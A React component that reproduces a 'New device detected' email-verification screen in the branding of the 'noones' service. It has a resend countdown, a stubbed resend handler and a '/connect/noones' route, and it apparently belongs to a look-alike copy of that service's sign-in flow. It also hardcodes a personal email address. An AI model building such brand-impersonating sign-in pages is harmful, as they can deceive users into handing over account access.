import React, { useState, useEffect } from 'react';
import { useNavigate, useLocation } from 'react-router-dom';

export default function NoonesDeviceVerification() {
  const navigate = useNavigate();
  const location = useLocation();
  const [resendTimer, setResendTimer] = useState(21);

  // Get email from location state
  const email = location.state?.email || 'gibsonkobia@gmail.com';

  // Timer for "Resend email" button
  useEffect(() => {
    if (resendTimer <= 0) return;
    const timer = setTimeout(() => setResendTimer(resendTimer - 1), 1000);
    return () => clearTimeout(timer);
  }, [resendTimer]);

  const handleResendEmail = () => {
    setResendTimer(21);
    // TODO: Implement resend email logic
  };

  const handleTryAnotherWay = () => {
    navigate('/connect/noones');
  };

  const handleCancelSignIn = () => {
    navigate('/');
  };

  return (
    <div className="min-h-screen bg-[#0f0f0f] flex flex-col items-center pt-12 font-sans text-white">
      <div className="mb-8">
        <h1 className="text-4xl font-black text-[#4ade80] tracking-tight">noones</h1>
      </div>

      <div className="w-full max-w-md bg-[#1e1e1e] rounded-xl p-8 mx-4 shadow-2xl">
        <div className="text-center">
          <h2 className="text-2xl font-bold mb-4">New device detected</h2>
          <p className="text-gray-400 text-sm mb-6">
            Confirm this is your device from the email we just sent to 
            <span className="block font-medium text-gray-300">{email}</span>
          </p>

          <div className="flex justify-center mb-6 opacity-40">
            <svg className="w-24 h-24" fill="currentColor" viewBox="0 0 24 24">
              <path d="M20 18h-1V6c0-1.1-.9-2-2-2H7c-1.1 0-2 .9-2 2v12H4c-1.1 0-2 .9-2 2h20c0-1.1-.9-2-2-2zm-13-12h10v12H7V6z"/>
            </svg>
          </div>

          <p className="text-gray-300 font-medium mb-8">We don't recognize this device</p>

          <div className="space-y-4">
            <button 
              onClick={handleResendEmail}
              disabled={resendTimer > 0}
              className={`w-full py-4 font-bold rounded-xl transition-colors ${
                resendTimer > 0 
                  ? 'bg-[#333333] text-gray-400 cursor-not-allowed' 
                  : 'bg-[#333333] hover:bg-[#444444] text-gray-400'
              }`}
            >
              Resend email ({resendTimer} sec.)
            </button>
            
            <button 
              onClick={handleTryAnotherWay}
              className="w-full py-4 bg-[#2a2a2a] hover:bg-[#353535] text-white font-bold rounded-xl border border-gray-700 transition-colors"
            >
              Try another way
            </button>

            <div className="pt-4">
              <a 
                href="#" 
                onClick={handleCancelSignIn}
                className="text-[#4ade80] font-medium hover:underline"
              >
                Cancel signing in
              </a>
            </div>
          </div>
        </div>
      </div>

      <div className="mt-auto w-full max-w-md flex justify-between p-6 items-center">
        <div className="flex items-center space-x-3 bg-[#1e1e1e] p-1 rounded-full px-2 border border-gray-800">
          <span className="text-yellow-500">☀️</span>
          <div className="w-12 h-6 bg-[#4ade80] rounded-full relative">
            <div className="absolute right-1 top-1 w-4 h-4 bg-white rounded-full"></div>
          </div>
          <span className="text-gray-500">🌙</span>
        </div>

        <div className="text-[#4ade80] flex items-center cursor-pointer">
          English <span className="ml-1 text-xs text-[#4ade80]">▼</span>
        </div>
      </div>
    </div>
  );
}
